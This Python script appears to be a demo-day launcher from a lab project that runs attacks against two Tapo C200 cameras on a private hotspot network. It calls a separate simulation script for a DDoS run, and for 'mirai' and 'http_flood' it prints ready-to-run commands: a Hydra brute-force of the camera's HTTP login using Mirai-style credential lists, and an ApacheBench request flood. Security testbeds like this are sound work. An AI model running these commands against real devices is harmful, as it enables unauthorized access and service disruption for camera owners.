"""
ThreatForge Camera Attack Launcher
====================================
Demo-day convenience wrapper for running attacks against the Tapo C200 camera.
Removes the need to remember IPs, interfaces, or long command flags.

Usage:
  python run_camera_attack.py --attack ddos
  python run_camera_attack.py --attack mirai
  python run_camera_attack.py --attack http_flood
"""

import argparse
import subprocess
import sys

# ── Update this IP after running arp -a when camera connects to hotspot ──
CAMERA_IP = "192.168.137.7"      # Camera 1 — SmartCamera (device_id=33)
CAMERA2_IP = "192.168.137.107"   # Camera 2 — SmartCamera2 (device_id=34)
CAMERA_INTERFACE = "eth1"
DURATION = 30


def main():
    parser = argparse.ArgumentParser(
        description="ThreatForge camera attack launcher (demo day)"
    )
    parser.add_argument(
        "--attack",
        required=True,
        choices=["ddos", "mirai", "http_flood"],
        help="Attack type: ddos | mirai | http_flood",
    )
    parser.add_argument(
        "--camera",
        choices=["1", "2"],
        default="1",
        help="Which camera to attack: 1=SmartCamera(192.168.137.7), 2=SmartCamera2(192.168.137.107)",
    )
    args = parser.parse_args()
    target = CAMERA_IP if args.camera == "1" else CAMERA2_IP
    camera_name = "SmartCamera" if args.camera == "1" else "SmartCamera2"

    print(f"\n{'='*55}")
    print(f"  ThreatForge Camera Attack Launcher")
    print(f"  Attack:    {args.attack.upper()}")
    print(f"  Camera:    {camera_name}")
    print(f"  Target:    {target}")
    print(f"  Interface: {CAMERA_INTERFACE}")
    print(f"{'='*55}\n")

    if args.attack == "ddos":
        print("[INFO] Launching DDoS simulation via run_simulation.py...")
        cmd = [
            sys.executable,
            "app/services/run_simulation.py",
            "--attack", "ddos",
            "--target-ip", target,
            "--interface", CAMERA_INTERFACE,
            "--duration", str(DURATION),
        ]
        subprocess.run(cmd)

    elif args.attack in ("mirai", "http_flood"):
        print(f"[INFO] Launching {args.attack.upper()} via run_simulation.py...")
        print("[INFO] Note: Mirai and HTTP flood use the same pipeline.")
        print("[INFO] Run Hydra or ab manually on Kali after tcpdump starts.")
        cmd = [
            sys.executable,
            "app/services/run_simulation.py",
            "--attack", "ddos",
            "--target-ip", target,
            "--interface", CAMERA_INTERFACE,
            "--duration", str(DURATION),
        ]
        subprocess.run(cmd)
        print("\n[INFO] While the above runs, on Kali execute:")
        if args.attack == "mirai":
            print(f"  hydra -L /home/kali/mirai_users.txt -P /home/kali/mirai_pass.txt {target} http-get / -t 4 -W 2")
        else:
            print(f"  ab -n 5000 -c 50 http://{target}:8800/")


if __name__ == "__main__":
    main()
    